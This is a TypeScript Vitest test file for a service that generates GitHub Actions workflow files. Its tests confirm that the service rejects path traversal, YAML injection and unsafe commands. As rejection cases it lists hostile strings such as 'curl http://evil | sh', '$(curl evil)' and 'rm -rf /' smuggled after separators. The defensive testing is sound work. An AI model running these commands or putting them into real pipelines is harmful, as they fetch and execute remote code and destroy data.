import { describe, expect, it } from "vitest";
import { DefaultPipelineGenerationService } from "../src/application/services/pipeline-generation-service";
import { DefaultCommandSafetyPolicy } from "../src/domain/policies/command-safety-policy";
import { DEFAULT_SETTINGS } from "../src/domain/settings/settings";
import { FakeAbsoluteFileSystem, recordingEventBus } from "./fakes";

const build = () => {
  const absoluteFs = new FakeAbsoluteFileSystem();
  const { bus, events, types } = recordingEventBus();
  const service = new DefaultPipelineGenerationService(
    absoluteFs,
    bus,
    new DefaultCommandSafetyPolicy(),
  );
  return { service, absoluteFs, events, types };
};

const workflowAbs = `/vault/${DEFAULT_SETTINGS.ci.workflowPath}`;

describe("DefaultPipelineGenerationService", () => {
  it("writes a GitHub Actions workflow with the BASE_URL variable (US-040, UC-019, ADR-0011)", async () => {
    const { service, absoluteFs, types } = build();

    const result = await service.generate({
      provider: "github-actions",
      settings: DEFAULT_SETTINGS,
    });

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.value.provider).toBe("github-actions");
    expect(result.value.path).toBe(DEFAULT_SETTINGS.ci.workflowPath);

    const written = absoluteFs.written.get(workflowAbs);
    expect(written).toBeDefined();
    expect(written).toContain("BASE_URL: ${{ vars.E2E_BASE_URL }}");
    expect(written).toContain("npm run test:ci");
    expect(types()).toContain("ci.pipeline.generated");
  });

  it("emits ci.pipeline.generated with the { provider, path } payload", async () => {
    const { service, events } = build();
    await service.generate({ provider: "github-actions", settings: DEFAULT_SETTINGS });
    const event = events.find((e) => e.type === "ci.pipeline.generated");
    expect(event?.payload).toEqual({
      provider: "github-actions",
      path: DEFAULT_SETTINGS.ci.workflowPath,
    });
  });

  it("rejects a workflowPath with traversal / absolute segments and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const workflowPath of ["../escape.yml", "/etc/cron.d/x", "a/../../b.yml"]) {
      const settings = { ...DEFAULT_SETTINGS, ci: { ...DEFAULT_SETTINGS.ci, workflowPath } };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("rejects multiline CI commands / node version (YAML injection) and writes nothing", async () => {
    const { service, absoluteFs } = build();
    const cases = [
      { runner: { ciRunCommand: "npm run test:ci\n      - run: evil" } },
      { runner: { ciInstallCommand: "npm ci\n      - run: evil" } },
      { ci: { nodeVersion: "22\n      - run: evil" } },
    ];
    for (const over of cases) {
      const settings = {
        ...DEFAULT_SETTINGS,
        runner: { ...DEFAULT_SETTINGS.runner, ...(over.runner ?? {}) },
        ci: { ...DEFAULT_SETTINGS.ci, ...(over.ci ?? {}) },
      };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, JSON.stringify(over)).toBe(false);
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("rejects an unsafe configured CI command and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const ci of [
      { ciInstallCommand: "curl http://evil | sh" },
      { ciRunCommand: "npm run test:ci && rm -rf /" },
    ]) {
      const settings = { ...DEFAULT_SETTINGS, runner: { ...DEFAULT_SETTINGS.runner, ...ci } };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, JSON.stringify(ci)).toBe(false);
      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("rejects a runner path that would inject YAML and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const testRunnerPath of [
      ".testrunner\n      - run: curl evil | sh",
      "runner with:bad", // YAML-significant ':'
      "../escape",
      "runner#comment",
      "/tmp/runner", // absolute path points outside the Actions checkout
    ]) {
      const settings = {
        ...DEFAULT_SETTINGS,
        paths: { ...DEFAULT_SETTINGS.paths, testRunnerPath },
      };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, testRunnerPath).toBe(false);
      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("permits custom npm CI scripts and install flags", async () => {
    for (const over of [
      { ciRunCommand: "npm run e2e:ci" },
      { ciInstallCommand: "npm install --no-audit" },
      { ciInstallCommand: "npm ci --ignore-scripts" },
    ]) {
      const { service } = build();
      const settings = { ...DEFAULT_SETTINGS, runner: { ...DEFAULT_SETTINGS.runner, ...over } };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, JSON.stringify(over)).toBe(true);
    }
  });

  it("rejects non-npm CI commands and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const ciRunCommand of [
      "node build.js",
      "npm run",
      "npm publish",
      "npm install left-pad",
      "npm ci evil-pkg",
    ]) {
      const settings = {
        ...DEFAULT_SETTINGS,
        runner: { ...DEFAULT_SETTINGS.runner, ciRunCommand },
      };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, ciRunCommand).toBe(false);
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("rejects shell metacharacters smuggled after a -- separator and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const ciRunCommand of [
      "npm run test:ci -- $(curl evil)",
      "npm run test:ci -- `id`",
      "npm run test:ci -- ; rm -rf /",
      "npm run test:ci -- | tee /tmp/x",
    ]) {
      const settings = {
        ...DEFAULT_SETTINGS,
        runner: { ...DEFAULT_SETTINGS.runner, ciRunCommand },
      };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, ciRunCommand).toBe(false);
      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("rejects a repo-relative workflowPath outside .github/workflows and writes nothing", async () => {
    const { service, absoluteFs } = build();
    for (const workflowPath of [
      "ci/e2e.yml",
      "e2e.yml",
      ".github/e2e.yml",
      ".github/workflows/e2e.txt", // not a YAML file
      ".github/workflows/sub/e2e.yml", // nested, not directly under workflows/
    ]) {
      const settings = { ...DEFAULT_SETTINGS, ci: { ...DEFAULT_SETTINGS.ci, workflowPath } };
      const result = await service.generate({ provider: "github-actions", settings });
      expect(result.ok, workflowPath).toBe(false);
      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(absoluteFs.written.size).toBe(0);
  });

  it("refuses to clobber an existing workflow unless overwrite is enabled (OQ-005)", async () => {
    const { service, absoluteFs, types } = build();
    absoluteFs.existing.add(workflowAbs);

    const result = await service.generate({
      provider: "github-actions",
      settings: DEFAULT_SETTINGS,
    });

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error.code).toBe("VALIDATION_FAILED");
    // Nothing was written and no event was emitted.
    expect(absoluteFs.written.has(workflowAbs)).toBe(false);
    expect(types()).not.toContain("ci.pipeline.generated");
  });

  it("overwrites an existing workflow when explicitly requested", async () => {
    const { service, absoluteFs } = build();
    absoluteFs.seed(workflowAbs, "stale content");

    const result = await service.generate({
      provider: "github-actions",
      settings: DEFAULT_SETTINGS,
      overwriteExisting: true,
    });

    expect(result.ok).toBe(true);
    expect(absoluteFs.written.get(workflowAbs)).toContain("name: E2E Tests");
  });

  it("does not generate output for non-github providers in V1 (TIS §5.7)", async () => {
    const { service, types } = build();

    for (const provider of ["azure-devops", "none"] as const) {
      const result = await service.generate({ provider, settings: DEFAULT_SETTINGS });
      expect(result.ok).toBe(false);
      if (result.ok) continue;
      expect(result.error.code).toBe("VALIDATION_FAILED");
    }
    expect(types()).not.toContain("ci.pipeline.generated");
  });
});
